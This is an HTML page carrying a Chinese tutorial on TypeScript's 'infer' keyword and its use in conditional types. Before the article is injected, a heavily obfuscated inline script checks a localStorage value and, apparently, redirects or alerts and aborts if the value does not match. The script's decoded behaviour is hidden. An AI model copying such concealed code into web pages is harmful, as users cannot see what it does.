<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x3359(){var e=["W5dcPqzlWPlcJHqe","WPRcOamlxSoiWQ/cTSkcW6ldNSkMWO4","WOFcU8o2p2CWD8kJW4W","wmo/W61ibCoEW6C7","ctZdMrTUW5zAW683WPNcRSkTDW","W6RcLCk+fCkmo8kS","sHf4W7VcRNxcJmoVWOJdVsO","j2zKu8kYCmokW4NdIG","W6ZcOZldRNpdVXVdVKtcKqxdRHVcVmo2pNRdOaK/W41lWRRcLCkbaq","i2LYdbNcVCkCACk4vSoC","WOGbW4FdKSk6W6ldPuZdHCov","vdW+amoXoSk3W7RdTcjLB8ov","WQ/cSmodW5Kmx8oCWRinva","WQNdG8o+sSouASk4ASoeWPSSW6S","rmoLW71Aca","WPddIXr8pmo9rcfKcW","qKK8WRhdPCkcnCkyWRjB","WOtcUCo2vZfcaSkkW6K4pSoLpq","W6mhaaKvW6i9W59lWR5nvmk7","WOzNW6HzydedWRT7W6C/kG","W6unbqeqWQnZW55rWRbZ","sb5WW7BcOXFdKmoYWRpdGcGlcq","W7NdTsjgAWpdNa","vtfYxSkiwCodW7W","WRddN8k6W4vquLnFpCopBa","W6pcUCoeW6hdRCkQWQxdKCkU"];return(_0x3359=function(){return e})()}var _0x8e0c6b=_0x5e42;function _0x5e42(c,e){var d=_0x3359();return(_0x5e42=function(e,n){var o=d[e-=460];void 0===_0x5e42.agXrrL&&(_0x5e42.cpsdTM=function(e,n){var o,r=[],c=0,d="";for(e=(e=>{for(var n,o,r="",c="",d=0,t=0;o=e.charAt(t++);~o&&(n=d%4?64*n+o:o,d++%4)&&(r+=String.fromCharCode(255&n>>(-2*d&6))))o="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(o);for(var i=0,l=r.length;i<l;i++)c+="%"+("00"+r.charCodeAt(i).toString(16)).slice(-2);return decodeURIComponent(c)})(e),t=0;t<256;t++)r[t]=t;for(t=0;t<256;t++)c=(c+r[t]+n.charCodeAt(t%n.length))%256,o=r[t],r[t]=r[c],r[c]=o;for(var t=0,c=0,i=0;i<e.length;i++)o=r[t=(t+1)%256],r[t]=r[c=(c+r[t])%256],r[c]=o,d+=String.fromCharCode(e.charCodeAt(i)^r[(r[t]+r[c])%256]);return d},c=arguments,_0x5e42.agXrrL=!0);var e=e+d[0],r=c[e];return r?o=r:(void 0===_0x5e42.mBOnnR&&(_0x5e42.mBOnnR=!0),o=_0x5e42.cpsdTM(o,n),c[e]=o),o})(c,e)}if((()=>{for(var e=_0x5e42,n=_0x3359();;)try{if(472876==+parseInt(e(466,"Tegh"))*(parseInt(e(477,"BT&k"))/2)+-parseInt(e(481,"rHXX"))/3+parseInt(e(462,"5h2@"))/4+parseInt(e(463,"lNV%"))/5*(-parseInt(e(460,"PVc1"))/6)+parseInt(e(472,"C0Mz"))/7+-parseInt(e(476,"SXnI"))/8*(-parseInt(e(470,"KBB*"))/9)+-parseInt(e(471,"cv3%"))/10)break;n.push(n.shift())}catch(e){n.push(n.shift())}})(),localStorage[_0x8e0c6b(473,"L[oF")](_0x8e0c6b(484,"5h2@"))!=_0x8e0c6b(465,"Li5H"))throw window[_0x8e0c6b(480,"Li5H")][_0x8e0c6b(482,"G!1%")](_0x8e0c6b(485,"Y^!x")),Error();document.title="typescript infer 关键字",document.getElementById("article").innerHTML="<div><p><strong>TypeScript 中的 <code>infer</code> 关键字</strong>  是条件类型中的一个重要特性，它允许开发者在类型系统中进行类型推断，从而提取出某个类型的具体部分。以下是关于 <code>infer</code> 关键字的详细解析：</p>\n<h3>一、基本语法与用法</h3>\n<ul>\n<li><strong>语法</strong>  ：<code>infer</code> 通常与条件类型（<code>extends</code>）配合使用，其基本语法结构为 <code>T extends SomeType&lt;infer U&gt; ? X : Y</code>。</li>\n<li><strong>用法</strong>  ：<code>infer</code> 用于声明一个类型变量（如 <code>U</code>），该变量会用来接收从 <code>T</code> 中推断出来的类型。如果 <code>T</code> 符合 <code>SomeType&lt;infer U&gt;</code> 的模式，那么 <code>U</code> 将被推断为 <code>T</code> 的某些组成部分，并在 <code>X</code> 中使用；否则返回 <code>Y</code>。</li>\n</ul>\n<h3>二、常见应用场景</h3>\n<ol>\n<li><strong>提取函数参数类型</strong>  ：\n<ul>\n<li>示例：<code>type ParametersType&lt;T&gt; = T extends (...args: infer P) =&gt; any ? P : never;</code></li>\n<li>解释：如果 <code>T</code> 是一个函数类型，<code>infer P</code> 会推断出该函数的参数类型，并返回一个元组类型。</li>\n</ul>\n</li>\n<li><strong>提取函数返回值类型</strong>  ：\n<ul>\n<li>示例：<code>type ReturnType&lt;T&gt; = T extends (...args: any[]) =&gt; infer R ? R : never;</code></li>\n<li>解释：如果 <code>T</code> 是一个函数类型，<code>infer R</code> 会推断出该函数的返回值类型。</li>\n</ul>\n</li>\n<li><strong>解构数组类型</strong>  ：\n<ul>\n<li>示例：<code>type ElementType&lt;T&gt; = T extends (infer U)[] ? U : never;</code></li>\n<li>解释：如果 <code>T</code> 是一个数组类型，<code>infer U</code> 会推断出该数组的元素类型。</li>\n</ul>\n</li>\n<li><strong>提取类的实例类型</strong>  ：\n<ul>\n<li>示例：<code>type InstanceType&lt;T&gt; = T extends new (...args: any[]) =&gt; infer R ? R : never;</code></li>\n<li>解释：如果 <code>T</code> 是一个类的构造函数类型，<code>infer R</code> 会推断出该类的实例类型。</li>\n</ul>\n</li>\n<li><strong>提取元组中的第一个元素类型</strong>  ：\n<ul>\n<li>示例：<code>type FirstElement&lt;T&gt; = T extends [infer F, ...any[]] ? F : never;</code></li>\n<li>解释：如果 <code>T</code> 是一个元组类型，<code>infer F</code> 会推断出该元组的第一个元素类型。</li>\n</ul>\n</li>\n</ol>\n<h3>三、特性与注意事项</h3>\n<ul>\n<li><strong>仅在条件类型中使用</strong>  ：<code>infer</code> 必须配合条件类型（<code>extends</code>）使用，不能单独使用。</li>\n<li><strong>模式匹配的局限性</strong>  ：<code>infer</code> 无法处理不符合模式的类型。例如，尝试从非元组数组中提取多个元素类型可能会失败。</li>\n<li><strong>复杂类型推导</strong>  ：对于嵌套结构的复杂类型，<code>infer</code> 的推导可能会变得难以理解。此时，可能需要使用嵌套推导或结合其他类型操作来实现目标。</li>\n</ul>\n<h3>四、高级用法</h3>\n<ul>\n<li><strong>嵌套推导</strong>  ：可以嵌套多个 <code>infer</code> 来推导深层次的类型。</li>\n<li><strong>与联合类型结合</strong>  ：<code>infer</code> 可以处理联合类型，但可能需要配合分布式条件类型使用。</li>\n</ul>\n<h3>五、意义与优势</h3>\n<ul>\n<li><strong>提升类型系统的灵活性</strong>  ：<code>infer</code> 让开发者可以通过模式匹配轻松操作复杂类型。</li>\n<li><strong>增强代码的类型安全性</strong>  ：通过动态推导，减少手动指定类型的需要，从而降低错误风险。</li>\n<li><strong>提高代码复用性</strong>  ：开发者可以编写通用的工具类型，适配多种场景。</li>\n</ul>\n</div>"</script></body></html>